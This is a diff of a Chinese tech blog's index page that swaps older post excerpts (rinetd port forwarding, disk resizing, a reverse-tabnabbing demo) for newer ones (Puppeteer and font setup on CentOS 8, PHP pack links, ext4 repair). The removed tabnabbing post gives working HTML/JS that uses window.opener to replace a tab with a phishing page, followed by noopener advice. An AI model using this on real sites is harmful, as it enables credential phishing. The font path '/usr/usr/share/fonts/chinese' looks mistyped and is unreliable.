@@ -155,7 +155,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2019/01/21/Linux-%E4%B8%8B%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%B7%A5%E5%85%B7-rinetd/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2020/10/20/CentOS-8-%E5%AE%89%E8%A3%85Puppeteer-%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -169,7 +169,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2019/01/21/Linux-%E4%B8%8B%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%B7%A5%E5%85%B7-rinetd/" class="post-title-link" itemprop="url">Linux 下端口映射工具 rinetd</a>
+            <a href="/2020/10/20/CentOS-8-%E5%AE%89%E8%A3%85Puppeteer-%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">CentOS 8 安装 Puppeteer 记录</a>
         </h2>
 
         <div class="post-meta">
@@ -179,7 +179,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2019-01-21 11:28:00" itemprop="dateCreated datePublished" datetime="2019-01-21T11:28:00+08:00">2019-01-21</time>
+              <time title="创建时间：2020-10-20 11:40:00" itemprop="dateCreated datePublished" datetime="2020-10-20T11:40:00+08:00">2020-10-20</time>
             </span>
 
           
@@ -193,29 +193,35 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>Linux下简单好用的工具rinetd，实现端口映射&#x2F;转发&#x2F;重定向</p>
-<p>官网地址<a target="_blank" rel="noopener" href="http://www.boutell.com/rinetd">http://www.boutell.com/rinetd</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#软件下载</span></span><br><span class="line">wget http://www.boutell.com/rinetd/http/rinetd.tar.gz</span><br><span class="line"><span class="comment">#解压安装</span></span><br><span class="line">tar zxvf rinetd.tar.gz</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑配置</span></span><br><span class="line">vi /etc/rinetd.conf</span><br><span class="line">0.0.0.0 8080   172.19.94.3 8080</span><br><span class="line">0.0.0.0 2222   192.168.0.103 3389</span><br><span class="line">1.2.3.4 80     192.168.0.10 80</span><br></pre></td></tr></table></figure>
+          <h3 id="先装node-js"><a href="#先装node-js" class="headerlink" title="先装node.js"></a>先装node.js</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y nodejs</span><br><span class="line">node -v</span><br></pre></td></tr></table></figure>
 
-<h3 id="说明一下"><a href="#说明一下" class="headerlink" title="说明一下"></a>说明一下</h3><ul>
-<li>0.0.0.0表示本机绑定所有可用地址</li>
-<li>将所有发往本机 8080 端口的请求转发到 172.19.94.3 的 8080 端口</li>
-<li>将所有发往本机 2222 端口的请求转发到 192.168.0.103的 3389 端口</li>
-<li>将所有发往 1.2.3.4 的 80 端口请求转发到 192.168.0.10 的 80 端口</li>
-</ul>
-<h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p>bindaddress bindport connectaddress connectport</p>
-<p>绑定的地址  绑定的端口  连接的地址  连接的端口</p>
-<p>或</p>
-<p>[Source Address] [Source Port] [Destination Address] [Destination Port]</p>
-<p>源地址  源端口   目的地址  目的端口</p>
-<p>###启动程序</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkill rinetd  ##关闭进程</span><br><span class="line">rinetd -c /etc/rinetd.conf  ##启动转发</span><br></pre></td></tr></table></figure>
-<p>把这条命令加到 &#x2F;etc&#x2F;rc.local 里面开机自动运行(可能情况不同，具体看如何实现开机启动的)</p>
-<h3 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h3><p>netstat -antup</p>
-<h3 id="需要注意"><a href="#需要注意" class="headerlink" title="需要注意"></a>需要注意</h3><ol>
-<li>rinetd.conf 中绑定的本机端口必须没有被其它程序占用</li>
-<li>运行 rinetd 的系统防火墙应该打开绑定的本机端口</li>
-</ol>
+<h3 id="然后是装-cnpm-（国外服务器不用这步）"><a href="#然后是装-cnpm-（国外服务器不用这步）" class="headerlink" title="然后是装 cnpm （国外服务器不用这步）"></a>然后是装 cnpm （国外服务器不用这步）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
+<p>新建一个目录用来部署  例如  &#x2F;data&#x2F;js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data/js</span><br><span class="line"></span><br><span class="line"># 再执行</span><br><span class="line"></span><br><span class="line">yum install -y firefox</span><br><span class="line"></span><br><span class="line">cnpm install puppeteer </span><br><span class="line">#（国外服务器用npm装，具体看https://github.com/puppeteer/puppeteer）</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以了，但是现在没有中文字体 ，网页截图发现中文都是方块</p>
+<p>字体参考教程 <a target="_blank" rel="noopener" href="https://blog.csdn.net/wlwlwlwl015/article/details/51482065">https://blog.csdn.net/wlwlwlwl015/article/details/51482065</a></p>
+<h3 id="安装字体库"><a href="#安装字体库" class="headerlink" title="安装字体库"></a>安装字体库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install fontconfig</span><br></pre></td></tr></table></figure>
+
+<h3 id="添加中文字体"><a href="#添加中文字体" class="headerlink" title="添加中文字体"></a>添加中文字体</h3><p>在 CentOS 中，字体库的存放位置是&#x2F;usr&#x2F;share&#x2F;fonts 和 fontconfig 目录，所以我们首先要做的就是找到中文字体文件放到该目录下，而中文字体文件在我们的 windows 系统中就可以找到，打开c盘下的 Windows&#x2F;Fonts 目录<br>，我们只需要将我们需要的字体拷贝出来并上传至 linu x服务器即可，在这里我选择宋体和黑体，是两个后缀名为ttf和ttc的文件：</p>
+<p>在这之前我们还需要新建目录，首先在 &#x2F;usr&#x2F;share&#x2F;fonts 目录下新建一个目录chinese：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /usr/share/fonts/chinese</span><br></pre></td></tr></table></figure>
+
+<p>然后就是将上面的两个字体上传至 &#x2F;usr&#x2F;share&#x2F;fonts&#x2F;chinese 目录下即可：</p>
+<p>紧接着需要修改chinese目录的权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 755 /usr/share/fonts/chinese</span><br></pre></td></tr></table></figure>
+
+<p>然后执行 ttmkfdir 命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ttmkfdir -e /usr/share/X11/fonts/encodings/encodings.dir</span><br></pre></td></tr></table></figure>
+
+<p>最后一步就是修改字体配置文件了，首先通过编辑器打开配置文件：</p>
+<p>vi &#x2F;etc&#x2F;fonts&#x2F;fonts.conf</p>
+<p>可以看到一个 Font list，即字体列表，在这里需要把我们添加的中文字体位置加进去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dir&gt;/usr/usr/share/fonts/chinese&lt;/dir&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后输入保存退出，最后别忘了刷新内存中的字体缓存，这样就不用reboot重启了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fc-cache</span><br></pre></td></tr></table></figure>
+<p>这样所有的步骤就算完成了，最后再次通过 fc-list 看一下字体列表</p>
 
       
     </div>
@@ -235,7 +241,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2019/01/03/linux-%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2020/09/10/PHP%E5%85%B3%E4%BA%8E-pack-unpack-%E8%BF%98%E6%9C%89%E5%AD%97%E8%8A%82%E5%BA%8F-%E5%A4%A7%E7%AB%AF%E5%BA%8F-%E5%B0%8F%E7%AB%AF%E5%BA%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -249,7 +255,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2019/01/03/linux-%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/" class="post-title-link" itemprop="url">linux 磁盘扩容</a>
+            <a href="/2020/09/10/PHP%E5%85%B3%E4%BA%8E-pack-unpack-%E8%BF%98%E6%9C%89%E5%AD%97%E8%8A%82%E5%BA%8F-%E5%A4%A7%E7%AB%AF%E5%BA%8F-%E5%B0%8F%E7%AB%AF%E5%BA%8F/" class="post-title-link" itemprop="url">PHP 关于 pack unpack 还有字节序 大端序  小端序</a>
         </h2>
 
         <div class="post-meta">
@@ -259,7 +265,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2019-01-03 18:23:00" itemprop="dateCreated datePublished" datetime="2019-01-03T18:23:00+08:00">2019-01-03</time>
+              <time title="创建时间：2020-09-10 01:01:00" itemprop="dateCreated datePublished" datetime="2020-09-10T01:01:00+08:00">2020-09-10</time>
             </span>
 
           
@@ -273,17 +279,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>记录一下云主机的扩容</p>
-<p>假如是设备 &#x2F;dev&#x2F;vdb 挂载在 &#x2F;data 目录</p>
-<ol>
-<li>卸载</li>
-<li>检查磁盘</li>
-<li>调整分区大小</li>
-<li>挂载<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//针对ext4文件格式的操作系统（如CentOS6）：</span><br><span class="line">umount /dev/vdb</span><br><span class="line">e2fsck -f /dev/vdb</span><br><span class="line">resize2fs /dev/vdb</span><br><span class="line">mount /dev/vdb /data</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//针对xfs文件格式的操作系统（如CentOS7）</span><br><span class="line">umount /dev/vdb</span><br><span class="line">xfs_repair /dev/vdb</span><br><span class="line">mount /dev/vdb /data</span><br><span class="line">xfs_growfs /data</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>上面的情况仅限于 2TB 以内的 MBR 分区。<br>如果是扩容到 2TB 以上的，从 MBR 转移 GPT 分区，需要先转移文件 然后重新分区。不要在没有备份的情况下轻易尝试直接转换。</p>
-<p>参考资料：<br><a target="_blank" rel="noopener" href="https://docs.ucloud.cn/udisk/userguide/extend/linux_raw">https://docs.ucloud.cn/udisk/userguide/extend/linux_raw</a></p>
+          <p>偶然在网上看到了三篇写的不错的文章，这里留个记录</p>
+<p><a target="_blank" rel="noopener" href="https://my.oschina.net/goal/blog/195749">PHP: 深入pack&#x2F;unpack</a></p>
+<p><a target="_blank" rel="noopener" href="https://my.oschina.net/goal/blog/202378">PHP: chr和pack、unpack那些事</a></p>
+<p><a target="_blank" rel="noopener" href="https://my.oschina.net/goal/blog/202381">PHP: pack&#x2F;unpack补遗</a></p>
+<p><a href="/2020/09/10/PHP%E5%85%B3%E4%BA%8E-pack-unpack-%E8%BF%98%E6%9C%89%E5%AD%97%E8%8A%82%E5%BA%8F-%E5%A4%A7%E7%AB%AF%E5%BA%8F-%E5%B0%8F%E7%AB%AF%E5%BA%8F/PHP%E5%AD%97%E8%8A%82%E5%BA%8F.rar">页面防丢备份</a></p>
 
       
     </div>
@@ -303,7 +303,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2020/09/05/%E4%BF%AE%E5%A4%8D-EXT2FSD-%E5%9C%A8-win10-%E4%B8%8B%E6%8C%82%E8%BD%BD-ext4-%EF%BC%88%E8%AF%86%E5%88%AB%E6%88%90ext3%EF%BC%89%E9%80%A0%E6%88%90%E7%9A%84%E5%88%86%E5%8C%BA%E6%8D%9F%E5%9D%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -317,7 +317,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/" class="post-title-link" itemprop="url">实战重现隐藏在 A 标签 _blank 下的危险漏洞,简略说明 noopener 的作用</a>
+            <a href="/2020/09/05/%E4%BF%AE%E5%A4%8D-EXT2FSD-%E5%9C%A8-win10-%E4%B8%8B%E6%8C%82%E8%BD%BD-ext4-%EF%BC%88%E8%AF%86%E5%88%AB%E6%88%90ext3%EF%BC%89%E9%80%A0%E6%88%90%E7%9A%84%E5%88%86%E5%8C%BA%E6%8D%9F%E5%9D%8F/" class="post-title-link" itemprop="url">修复 EXT2FSD 在 win10 下挂载 ext4 （识别成ext3）造成的分区损坏</a>
         </h2>
 
         <div class="post-meta">
@@ -327,7 +327,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2018-12-24 16:56:00" itemprop="dateCreated datePublished" datetime="2018-12-24T16:56:00+08:00">2018-12-24</time>
+              <time title="创建时间：2020-09-05 22:42:00" itemprop="dateCreated datePublished" datetime="2020-09-05T22:42:00+08:00">2020-09-05</time>
             </span>
 
           
@@ -341,43 +341,13 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>前几日，在看阮一峰老师的博客<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2018/12/weekly-issue-36.html">文章</a>中，发现了这么<a target="_blank" rel="noopener" href="https://www.tutorialdocs.com/article/html-opener-blank.html">一篇</a> 。标题为 《target &#x3D; “_blank” 的危险性（英文）》。这篇文章同事看过之后因为不理解其中的危险之处，念念不忘。于是这里我们来重现一下这个漏洞。</p>
-<p>首先做点准备：</p>
-<p>准备两个域名 </p>
-<ul>
-<li>a.com </li>
-<li>b.com</li>
-</ul>
-<p>分别解析到 127.0.0.1<br>配置好两个域名对应的http服务</p>
-<p>安装好 chrome 浏览器<br>正式开始</p>
-<p>首先在a.com下 建立1.html 写入代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">         </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;信用卡+密码表单&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://b.com/b.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> &gt;</span>B站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在代码中，我们建立了一个A标签，链接到B站点，地址为 <a target="_blank" rel="noopener" href="http://b.com/b.html">http://b.com/b.html</a> 打开方式为 新标签页打开 也就是target&#x3D;”_blank”</p>
-<p>将这个1.html文件复制一份到b站点的目录中并修改代码为</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;信用卡+密码表单+钓鱼页面&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://b.com/b.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> &gt;</span>B站<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>注意”钓鱼页面”部分，这里是为了区分第一个页面加的标记。准备好以后再建立一个 b.html 满足 A 标签的目标文件。</p>
-<p>b.html 代码为</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">dosth</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">location</span> = <span class="string">&quot;http://b.com/1.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&quot;OK&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>b.com<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;dosth();&quot;</span>&gt;</span>js<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>至此代码准备完毕，开始重现漏洞触发过程</p>
-<p>打开Chrome ，当前版本为 </p>
-<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/1.png" alt="1"></p>
-<p>输入a.com&#x2F;1.html 访问</p>
-<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/2.png" alt="2"></p>
-<p>点击A标签 B站 此时弹出新页面</p>
-<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/3.png" alt="3"></p>
-<p>点击那个JS按钮，执行一段神不知鬼不觉的JS</p>
-<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/4.png" alt="4"></p>
-<p>此时浏览器返回去看上一个页面 已经神不知鬼不觉的变成了一个钓鱼页面</p>
-<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/5.png" alt="5"></p>
-<p>至此，整个漏洞利用的攻击过程结束。用户以为自己回到了A 结果神不知鬼不觉的访问了 B （页面假装和A一样）<br>如果这个时候用户输入了敏感信息，那么这个信息就会被提交B网站</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>那么只要有A标签的地方，并且使用了_blank的方式打开，那么都会有这个被钓鱼的风险。怎么避免风险呢，</p>
-<p>如果你是一个普通用户，那么在输入敏感信息之前，一定一定一定要确认当前的url是不是正确的url，也就是防钓鱼的那一套。</p>
-<p>如果你是一个开发者，那么请在你的网站上面，所有类似的A标签上加入属性 rel&#x3D;”noopener” 来防止这个漏洞被利用</p>
-<p>但是这里要值得一提的是，noopener 并不是所有浏览器都支持的，它的支持程度如下图</p>
-<p><img src="/2018/12/24/%E5%AE%9E%E6%88%98%E9%87%8D%E7%8E%B0%E9%9A%90%E8%97%8F%E5%9C%A8-A-%E6%A0%87%E7%AD%BE-blank-%E4%B8%8B%E7%9A%84%E5%8D%B1%E9%99%A9%E6%BC%8F%E6%B4%9E-%E7%AE%80%E7%95%A5%E8%AF%B4%E6%98%8E-noopener-%E7%9A%84%E4%BD%9C%E7%94%A8/6.png" alt="6"></p>
-<p>无脑一点的方案就是 rel&#x3D;”nofollow noopener noreferrer”  这样来阻止。</p>
-<p>到此本文最初的目的“最简单的实现一次这个漏洞攻击”已经达到了，还有一些细节没有补充，具体可以阅读原文</p>
-<p><a target="_blank" rel="noopener" href="https://www.tutorialdocs.com/article/html-opener-blank.html">https://www.tutorialdocs.com/article/html-opener-blank.html</a> 来了解更多详情。</p>
+          <p>从这里看到的</p>
+<p><a target="_blank" rel="noopener" href="https://morningd.github.io/2017/07/18/use-ext2fsd-mount-ext4-partition-cause-a-superblock-error/">https://morningd.github.io/2017/07/18/use-ext2fsd-mount-ext4-partition-cause-a-superblock-error/</a></p>
+<p>网址失效，保存了一个截图</p>
+<p><img src="/2020/09/05/%E4%BF%AE%E5%A4%8D-EXT2FSD-%E5%9C%A8-win10-%E4%B8%8B%E6%8C%82%E8%BD%BD-ext4-%EF%BC%88%E8%AF%86%E5%88%AB%E6%88%90ext3%EF%BC%89%E9%80%A0%E6%88%90%E7%9A%84%E5%88%86%E5%8C%BA%E6%8D%9F%E5%9D%8F/ext4.png" alt="输入图片说明"></p>
+<p>知道设备名称 </p>
+<p>然后直接运行</p>
+<p>fsck -t ext4 &#x2F;dev&#x2F;sda2（假设这个&#x2F;dev&#x2F;sda2是要修复的设备）</p>
 
       
     </div>
@@ -397,7 +367,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2018/07/14/BOM-%E5%A4%B4%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8E%BB%E6%8E%89/">
+    <link itemprop="mainEntityOfPage" href="https://np.lvtoude.ltd/2020/08/24/Yii-1-%E8%AE%B0%E5%BD%95%E6%89%A7%E8%A1%8C%E7%9A%84-SQL/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -411,7 +381,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/07/14/BOM-%E5%A4%B4%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8E%BB%E6%8E%89/" class="post-title-link" itemprop="url">BOM 头是什么，怎么除去件</a>
+            <a href="/2020/08/24/Yii-1-%E8%AE%B0%E5%BD%95%E6%89%A7%E8%A1%8C%E7%9A%84-SQL/" class="post-title-link" itemprop="url">Yii 1 记录执行的 SQL</a>
         </h2>
 
         <div class="post-meta">
@@ -421,7 +391,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2018-07-14 10:34:00" itemprop="dateCreated datePublished" datetime="2018-07-14T10:34:00+08:00">2018-07-14</time>
